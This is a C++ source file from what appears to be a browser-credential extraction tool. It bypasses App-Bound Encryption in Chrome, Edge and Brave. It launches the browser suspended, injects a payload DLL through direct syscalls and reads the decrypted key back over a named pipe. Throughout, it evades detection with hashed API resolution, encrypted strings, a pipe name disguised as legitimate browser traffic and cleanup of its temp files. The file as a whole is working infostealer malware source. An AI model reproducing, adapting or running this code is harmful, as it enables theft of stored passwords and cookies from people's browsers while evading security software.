#define NOMINMAX
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include "abe_decryption.h"
#include "logger.h"
#include "syscalls/syscall_resolver.h"
#include "str_encrypt.h"
#include "peb_resolve.h"    // IMP(), PebResolve, H_* constants

#if __has_include("payload_dll_data.h")
#include "payload_dll_data.h"
#define HAS_EMBEDDED_PAYLOAD 1
#endif

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "shell32.lib")
// bcrypt.lib intentionally omitted — BCryptGenRandom resolved via IMP()

using namespace ChromeExtractor::Syscalls;
using namespace ChromeExtractor::Imports;

// ── Kernel32/KernelBase type aliases used across this file ──────────────────

using FnCreateProcessA   = BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES,
                                          LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                                          LPVOID, LPCSTR, LPSTARTUPINFOA,
                                          LPPROCESS_INFORMATION);
using FnWaitForSingleObj = DWORD(WINAPI*)(HANDLE, DWORD);
using FnGetTempPathA     = DWORD(WINAPI*)(DWORD, LPSTR);
using FnCreateFileA_t    = HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD,
                                            LPSECURITY_ATTRIBUTES, DWORD,
                                            DWORD, HANDLE);
using FnWriteFile_t      = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                          LPOVERLAPPED);
using FnReadFile_t       = BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD,
                                          LPOVERLAPPED);
using FnCloseHandle_t    = BOOL(WINAPI*)(HANDLE);
using FnDeleteFileA_t    = BOOL(WINAPI*)(LPCSTR);
using FnGetModFileNameA  = DWORD(WINAPI*)(HMODULE, LPSTR, DWORD);
using FnCreateNamedPipe  = HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, DWORD,
                                            DWORD, DWORD, DWORD,
                                            LPSECURITY_ATTRIBUTES);
using FnCreateEventA_t   = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL,
                                            BOOL, LPCSTR);
using FnConnectNamedPipe = BOOL(WINAPI*)(HANDLE, LPOVERLAPPED);
using FnTerminateProcess = BOOL(WINAPI*)(HANDLE, UINT);
using FnGetOverlapped    = BOOL(WINAPI*)(HANDLE, LPOVERLAPPED, LPDWORD, BOOL);
using FnGetFileAttribA   = DWORD(WINAPI*)(LPCSTR);

// ── File-local API cache: resolved once, reused ─────────────────────────────

struct AbeApi {
    FnCreateProcessA   CreateProcessA    = nullptr;
    FnWaitForSingleObj WaitForSingleObj  = nullptr;
    FnGetTempPathA     GetTempPathA      = nullptr;
    FnCreateFileA_t    CreateFileA       = nullptr;
    FnWriteFile_t      WriteFile         = nullptr;
    FnReadFile_t       ReadFile          = nullptr;
    FnCloseHandle_t    CloseHandle       = nullptr;
    FnDeleteFileA_t    DeleteFileA       = nullptr;
    FnGetModFileNameA  GetModFileNameA   = nullptr;
    FnCreateNamedPipe  CreateNamedPipeA  = nullptr;
    FnCreateEventA_t   CreateEventA      = nullptr;
    FnConnectNamedPipe ConnectNamedPipe  = nullptr;
    FnTerminateProcess TerminateProcess  = nullptr;
    FnGetOverlapped    GetOverlappedResult = nullptr;
    FnGetFileAttribA   GetFileAttributesA = nullptr;

    bool ok = false;

    void Init() {
        if (ok) return;
        void* hK = PebGetModule(H_KERNELBASE);
        if (!hK) hK = PebGetModule(H_KERNEL32);
        if (!hK) return;

        auto R = [&](DWORD h) -> void* {
            return PebGetExport(hK, h);
        };

        CreateProcessA    = reinterpret_cast<FnCreateProcessA>  (R(PebHash("CreateProcessA")));
        WaitForSingleObj  = reinterpret_cast<FnWaitForSingleObj>(R(PebHash("WaitForSingleObject")));
        GetTempPathA      = reinterpret_cast<FnGetTempPathA>    (R(PebHash("GetTempPathA")));
        CreateFileA       = reinterpret_cast<FnCreateFileA_t>   (R(PebHash("CreateFileA")));
        WriteFile         = reinterpret_cast<FnWriteFile_t>     (R(PebHash("WriteFile")));
        ReadFile          = reinterpret_cast<FnReadFile_t>      (R(PebHash("ReadFile")));
        CloseHandle       = reinterpret_cast<FnCloseHandle_t>   (R(PebHash("CloseHandle")));
        DeleteFileA       = reinterpret_cast<FnDeleteFileA_t>   (R(PebHash("DeleteFileA")));
        GetModFileNameA   = reinterpret_cast<FnGetModFileNameA> (R(PebHash("GetModuleFileNameA")));
        CreateNamedPipeA  = reinterpret_cast<FnCreateNamedPipe> (R(PebHash("CreateNamedPipeA")));
        CreateEventA      = reinterpret_cast<FnCreateEventA_t>  (R(PebHash("CreateEventA")));
        ConnectNamedPipe  = reinterpret_cast<FnConnectNamedPipe>(R(PebHash("ConnectNamedPipe")));
        TerminateProcess  = reinterpret_cast<FnTerminateProcess>(R(PebHash("TerminateProcess")));
        GetOverlappedResult = reinterpret_cast<FnGetOverlapped> (R(PebHash("GetOverlappedResult")));
        GetFileAttributesA  = reinterpret_cast<FnGetFileAttribA>(R(PebHash("GetFileAttributesA")));

        ok = (CreateProcessA && WaitForSingleObj && GetTempPathA
           && CreateFileA && WriteFile && ReadFile && CloseHandle);
    }
};

static AbeApi& Api() {
    static AbeApi inst;
    inst.Init();
    return inst;
}

// ── Browser path finder ──────────────────────────────────────────────────────

static std::string FindBrowserPath(const std::string& browser) {
    char local_app[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, local_app);
    char prog_files[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_PROGRAM_FILES, nullptr, 0, prog_files);
    char prog_files_x86[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_PROGRAM_FILESX86, nullptr, 0, prog_files_x86);
    const char* prefixes[] = { local_app, prog_files, prog_files_x86 };

    bool want_edge  = (browser == "edge" || browser == "msedge");
    bool want_brave = (browser == "brave");

    struct Candidate { std::string rel; };
    const Candidate edge_cands[]   = { {XSTR("\\Microsoft\\Edge\\Application\\msedge.exe")} };
    const Candidate brave_cands[]  = { {XSTR("\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")} };
    const Candidate chrome_cands[] = { {XSTR("\\Google\\Chrome\\Application\\chrome.exe")} };

    auto tryList = [&](const Candidate* list, int n) -> std::string {
        auto& a = Api();
        for (int i = 0; i < n; i++)
            for (const char* p : prefixes) {
                if (!p || !p[0]) continue;
                std::string path = std::string(p) + list[i].rel;
                DWORD attr = a.GetFileAttributesA
                    ? a.GetFileAttributesA(path.c_str())
                    : GetFileAttributesA(path.c_str());
                if (attr != INVALID_FILE_ATTRIBUTES) return path;
            }
        return "";
    };

    if (want_edge)  return tryList(edge_cands,  1);
    if (want_brave) return tryList(brave_cands, 1);
    return tryList(chrome_cands, 1);
}

// ── Launch browser suspended ─────────────────────────────────────────────────

static HANDLE LaunchSuspended(const std::string& path,
                               DWORD& out_pid, HANDLE& out_thread) {
    auto& a = Api();
    if (!a.CreateProcessA) return nullptr;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    std::string mpath = path;                  // mutable copy for lpCommandLine
    if (!a.CreateProcessA(mpath.c_str(), nullptr, nullptr, nullptr,
                          FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return nullptr;
    out_thread = pi.hThread;
    out_pid    = pi.dwProcessId;
    return pi.hProcess;
}

static std::string g_payload_dll_path;

// ── Pre-load a DLL into the remote process ───────────────────────────────────

static void PreloadDllInRemote(HANDLE hProc, const char* dll_name) {
    FARPROC pfnLoadLib = PebResolve<FARPROC>(H_KERNEL32, H_LoadLib);
    if (!pfnLoadLib) return;

    SIZE_T name_len = strlen(dll_name) + 1;
    PVOID  rStr = nullptr;
    SIZE_T rSz  = name_len;

    DWORD   ssnAlloc = GetSSN(SyscallId::NtAllocateVirtualMemory);
    NTSTATUS st = SysNtAllocateVirtualMemory(hProc, &rStr, 0, &rSz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, ssnAlloc);
    if (!NT_SUCCESS(st)) return;

    SIZE_T bw = 0;
    DWORD  ssnWrite = GetSSN(SyscallId::NtWriteVirtualMemory);
    SysNtWriteVirtualMemory(hProc, rStr, (PVOID)dll_name, name_len, &bw, ssnWrite);

    HANDLE ht = nullptr;
    DWORD  ssnCTE = GetSSN(SyscallId::NtCreateThreadEx);
    SysNtCreateThreadEx(&ht, THREAD_ALL_ACCESS, nullptr, hProc,
        pfnLoadLib, rStr, 0, 0, 0, 0, nullptr, ssnCTE);
    if (ht) {
        auto& a = Api();
        if (a.WaitForSingleObj) a.WaitForSingleObj(ht, 5000);
        DWORD ssnClose = GetSSN(SyscallId::NtClose);
        SysNtClose(ht, ssnClose);
    }

    PVOID rBase = rStr;
    SIZE_T rFree = 0;
    DWORD ssnFree = GetSSN(SyscallId::NtFreeVirtualMemory);
    SysNtFreeVirtualMemory(hProc, &rBase, &rFree, MEM_RELEASE, ssnFree);
}

// ── Reflective DLL injection ─────────────────────────────────────────────────

static bool InjectReflective(HANDLE hProc,
                              const uint8_t* dll_bytes, size_t dll_size) {
    auto& a = Api();
    if (!a.GetTempPathA || !a.CreateFileA || !a.WriteFile || !a.CloseHandle)
        return false;

    char tmp_dir[MAX_PATH] = {};
    a.GetTempPathA(MAX_PATH, tmp_dir);
    g_payload_dll_path = std::string(tmp_dir) + "cex_p.dll";

    HANDLE hf = a.CreateFileA(g_payload_dll_path.c_str(),
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) {
        g_logger.Error("InjectReflective: temp DLL write failed: "
            + std::to_string(GetLastError()));
        g_payload_dll_path.clear();
        return false;
    }
    DWORD wr = 0;
    a.WriteFile(hf, dll_bytes, (DWORD)dll_size, &wr, nullptr);
    a.CloseHandle(hf);

    const char* dll_path_c = g_payload_dll_path.c_str();
    SIZE_T sz = strlen(dll_path_c) + 1;
    PVOID  rRemote = nullptr;
    SIZE_T rSz     = sz;

    DWORD   ssnAlloc = GetSSN(SyscallId::NtAllocateVirtualMemory);
    NTSTATUS st = SysNtAllocateVirtualMemory(hProc, &rRemote, 0, &rSz,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, ssnAlloc);
    if (!NT_SUCCESS(st)) {
        g_logger.Error("InjectReflective: alloc failed: 0x"
            + std::to_string((uint32_t)st));
        if (a.DeleteFileA) a.DeleteFileA(g_payload_dll_path.c_str());
        g_payload_dll_path.clear();
        return false;
    }

    SIZE_T bw = 0;
    DWORD  ssnWrite = GetSSN(SyscallId::NtWriteVirtualMemory);
    SysNtWriteVirtualMemory(hProc, rRemote, (PVOID)dll_path_c, sz, &bw, ssnWrite);

    FARPROC loadlib = PebResolve<FARPROC>(H_KERNEL32, H_LoadLib);
    HANDLE  ht = nullptr;
    DWORD   ssnCTE = GetSSN(SyscallId::NtCreateThreadEx);
    st = SysNtCreateThreadEx(&ht, THREAD_ALL_ACCESS, nullptr, hProc,
        loadlib, rRemote, 0, 0, 0, 0, nullptr, ssnCTE);

    bool ok = false;
    if (NT_SUCCESS(st) && ht) {
        if (a.WaitForSingleObj) a.WaitForSingleObj(ht, 10000);
        DWORD ssnClose = GetSSN(SyscallId::NtClose);
        SysNtClose(ht, ssnClose);
        ok = true;
    }
    else {
        g_logger.Error("InjectReflective: NtCreateThreadEx failed: 0x"
            + std::to_string((uint32_t)st));
    }

    PVOID   rb = rRemote;
    SIZE_T  rs = 0;
    DWORD   ssnFree = GetSSN(SyscallId::NtFreeVirtualMemory);
    SysNtFreeVirtualMemory(hProc, &rb, &rs, MEM_RELEASE, ssnFree);
    return ok;
}

// ── Internal state ───────────────────────────────────────────────────────────

static std::string g_abe_last_error;

// ── Exe directory (for side-by-side payload DLL) ─────────────────────────────

static std::string GetExeDir() {
    auto& a = Api();
    char path[MAX_PATH] = {};
    if (a.GetModFileNameA)
        a.GetModFileNameA(nullptr, path, MAX_PATH);
    std::string s = path;
    size_t p = s.find_last_of("\\");
    return (p != std::string::npos) ? s.substr(0, p) : s;
}

// ── Pipe name (random suffix via IMP BCryptGenRandom) ────────────────────────

static std::string MakePipeName() {
    DWORD rnd = 0;
    auto pBCG = IMP(BCryptGenRandom);
    if (pBCG)
        pBCG(nullptr, (PUCHAR)&rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    char hex[9] = {};
    sprintf_s(hex, sizeof(hex), "%08X", rnd);
    // "mojo." prefix is benign metadata, not a detection string
    return std::string("mojo.") + std::to_string(GetCurrentProcessId())
         + std::string(".self.") + hex;
}

// ── Main ABE decrypt call ─────────────────────────────────────────────────────

std::vector<uint8_t> ABEDecryption::Decrypt(
    const std::vector<uint8_t>& encrypted_data,
    const std::string& browser)
{
    if (encrypted_data.empty()) return {};
    Initialize();

    auto& a = Api();
    if (!a.ok) {
        g_logger.Error("ABEDecryption: API resolver failed");
        return {};
    }

    std::string pipe_name = MakePipeName();
    std::string pipe_path = "\\\\.\\pipe\\" + pipe_name;

    HANDLE hPipe = a.CreateNamedPipeA
        ? a.CreateNamedPipeA(pipe_path.c_str(),
            PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 64, 64, 0, nullptr)
        : INVALID_HANDLE_VALUE;

    if (hPipe == INVALID_HANDLE_VALUE) {
        g_logger.Error("CreateNamedPipe failed: " + std::to_string(GetLastError()));
        return {};
    }

    OVERLAPPED ov = {};
    ov.hEvent = a.CreateEventA
        ? a.CreateEventA(nullptr, TRUE, FALSE, nullptr)
        : nullptr;

    if (a.ConnectNamedPipe) a.ConnectNamedPipe(hPipe, &ov);
    DWORD conn_err = GetLastError();

    char tmp_dir[MAX_PATH] = {};
    a.GetTempPathA(MAX_PATH, tmp_dir);
    std::string data_file = std::string(tmp_dir) + "cex_payload.bin";

    HANDLE hFile = a.CreateFileA(data_file.c_str(), GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        g_logger.Error("Failed to create temp data file: "
            + std::to_string(GetLastError()));
        if (ov.hEvent) a.CloseHandle(ov.hEvent);
        a.CloseHandle(hPipe);
        return {};
    }

    DWORD wr = 0;
    DWORD plen = (DWORD)pipe_name.size() + 1;
    DWORD klen = (DWORD)encrypted_data.size();
    BYTE  browser_flag = (browser == "edge" || browser == "msedge") ? 1
                       : (browser == "brave")                        ? 2 : 0;

    a.WriteFile(hFile, &plen,                  4,    &wr, nullptr);
    a.WriteFile(hFile, pipe_name.c_str(),      plen, &wr, nullptr);
    a.WriteFile(hFile, &klen,                  4,    &wr, nullptr);
    a.WriteFile(hFile, encrypted_data.data(),  klen, &wr, nullptr);
    a.WriteFile(hFile, &browser_flag,          1,    &wr, nullptr);
    a.CloseHandle(hFile);

    std::string browser_path = FindBrowserPath(browser);
    if (browser_path.empty()) {
        g_abe_last_error = "browser executable not found for: " + browser;
        g_logger.Error(g_abe_last_error);
        if (ov.hEvent) a.CloseHandle(ov.hEvent);
        CancelIo(hPipe); a.CloseHandle(hPipe);
        a.DeleteFileA(data_file.c_str());
        return {};
    }

#ifndef HAS_EMBEDDED_PAYLOAD
    std::string dll_path = GetExeDir() + "\\payload_dll.dll";
    if (a.GetFileAttributesA &&
        a.GetFileAttributesA(dll_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
        g_abe_last_error = "payload_dll.dll not found";
        g_logger.Error(g_abe_last_error);
        if (ov.hEvent) a.CloseHandle(ov.hEvent);
        CancelIo(hPipe); a.CloseHandle(hPipe);
        a.DeleteFileA(data_file.c_str());
        return {};
    }
#endif

    g_logger.Info("Launching suspended: " + browser_path);
    DWORD  chrome_pid   = 0;
    HANDLE hMainThread  = nullptr;
    HANDLE hChrome = LaunchSuspended(browser_path, chrome_pid, hMainThread);
    if (!hChrome) {
        g_abe_last_error = "failed to launch suspended process ("
            + std::to_string(GetLastError()) + ")";
        g_logger.Error(g_abe_last_error);
        if (ov.hEvent) a.CloseHandle(ov.hEvent);
        CancelIo(hPipe); a.CloseHandle(hPipe);
        a.DeleteFileA(data_file.c_str());
        return {};
    }
    if (hMainThread) a.CloseHandle(hMainThread);

    g_logger.Info("Browser PID: " + std::to_string(chrome_pid)
        + " - injecting payload...");
    bool injected = false;

#ifdef HAS_EMBEDDED_PAYLOAD
    injected = InjectReflective(hChrome, kPayloadDll, kPayloadDllSize);
#else
    {
        SIZE_T sz = strlen(dll_path.c_str()) + 1;
        PVOID  rRemote = nullptr;
        SIZE_T rSz = sz;
        DWORD  ssnAlloc = GetSSN(SyscallId::NtAllocateVirtualMemory);
        NTSTATUS st = SysNtAllocateVirtualMemory(hChrome, &rRemote, 0, &rSz,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, ssnAlloc);
        if (NT_SUCCESS(st)) {
            SIZE_T bw = 0;
            DWORD  ssnWrite = GetSSN(SyscallId::NtWriteVirtualMemory);
            SysNtWriteVirtualMemory(hChrome, rRemote,
                (PVOID)dll_path.c_str(), sz, &bw, ssnWrite);

            FARPROC loadlib = PebResolve<FARPROC>(H_KERNEL32, H_LoadLib);
            HANDLE  ht = nullptr;
            DWORD   ssnCTE = GetSSN(SyscallId::NtCreateThreadEx);
            SysNtCreateThreadEx(&ht, THREAD_ALL_ACCESS, nullptr, hChrome,
                loadlib, rRemote, 0, 0, 0, 0, nullptr, ssnCTE);
            if (ht) {
                if (a.WaitForSingleObj) a.WaitForSingleObj(ht, 10000);
                DWORD ssnClose = GetSSN(SyscallId::NtClose);
                SysNtClose(ht, ssnClose);
                injected = true;
            }
            PVOID  rb = rRemote; SIZE_T rs = 0;
            DWORD  ssnFree = GetSSN(SyscallId::NtFreeVirtualMemory);
            SysNtFreeVirtualMemory(hChrome, &rb, &rs, MEM_RELEASE, ssnFree);
        }
    }
#endif

    if (!injected) {
        g_abe_last_error = "DLL injection failed ("
            + std::to_string(GetLastError()) + ")";
        g_logger.Error(g_abe_last_error);
        if (a.TerminateProcess) a.TerminateProcess(hChrome, 0);
        a.CloseHandle(hChrome);
        if (ov.hEvent) a.CloseHandle(ov.hEvent);
        CancelIo(hPipe); a.CloseHandle(hPipe);
        a.DeleteFileA(data_file.c_str());
        return {};
    }

    g_logger.Info("Payload injected, waiting for ABE key...");

    bool connected = false;
    if (conn_err == ERROR_IO_PENDING) {
        DWORD wait = a.WaitForSingleObj
            ? a.WaitForSingleObj(ov.hEvent, 20000) : WAIT_TIMEOUT;
        if (wait == WAIT_OBJECT_0) {
            DWORD transferred = 0;
            connected = a.GetOverlappedResult
                && (a.GetOverlappedResult(hPipe, &ov, &transferred, FALSE) != 0);
        }
    }
    else if (conn_err == ERROR_PIPE_CONNECTED) {
        connected = true;
    }

    if (ov.hEvent) a.CloseHandle(ov.hEvent);
    if (a.TerminateProcess) a.TerminateProcess(hChrome, 0);
    if (a.WaitForSingleObj)  a.WaitForSingleObj(hChrome, 2000);
    a.CloseHandle(hChrome);

    if (!g_payload_dll_path.empty()) {
        if (a.DeleteFileA) a.DeleteFileA(g_payload_dll_path.c_str());
        g_payload_dll_path.clear();
    }

    if (!connected) {
        g_abe_last_error = "payload timed out - IElevator COM call failed";
        g_logger.Error(g_abe_last_error);
        CancelIo(hPipe); a.CloseHandle(hPipe);
        if (a.DeleteFileA) a.DeleteFileA(data_file.c_str());
        return {};
    }

    uint8_t  buffer[64] = {};
    DWORD    bytes_read  = 0;
    OVERLAPPED ov_read  = {};
    ov_read.hEvent = a.CreateEventA
        ? a.CreateEventA(nullptr, TRUE, FALSE, nullptr) : nullptr;

    if (a.ReadFile && !a.ReadFile(hPipe, buffer, sizeof(buffer),
                                  &bytes_read, &ov_read)) {
        if (GetLastError() == ERROR_IO_PENDING && a.WaitForSingleObj) {
            a.WaitForSingleObj(ov_read.hEvent, 5000);
            if (a.GetOverlappedResult)
                a.GetOverlappedResult(hPipe, &ov_read, &bytes_read, FALSE);
        }
    }

    if (ov_read.hEvent) a.CloseHandle(ov_read.hEvent);
    a.CloseHandle(hPipe);
    if (a.DeleteFileA) a.DeleteFileA(data_file.c_str());

    if (!bytes_read) {
        g_logger.Error("No key data received from payload");
        return {};
    }

    g_logger.Info("ABE decryption succeeded! Key: "
        + std::to_string(bytes_read) + " bytes");
    return std::vector<uint8_t>(buffer, buffer + bytes_read);
}

bool ABEDecryption::InitializeCOM() { return true; }
void ABEDecryption::CleanupCOM()    {}

bool ABEDecryption::IsAvailable() {
    return !FindBrowserPath("chrome").empty()
        || !FindBrowserPath("edge").empty()
        || !FindBrowserPath("brave").empty();
}

std::string ABEDecryption::GetBrowserExePath(const std::string& browser) {
    return FindBrowserPath(browser);
}

std::string ABEDecryption::GetFailureReason() { return g_abe_last_error; }
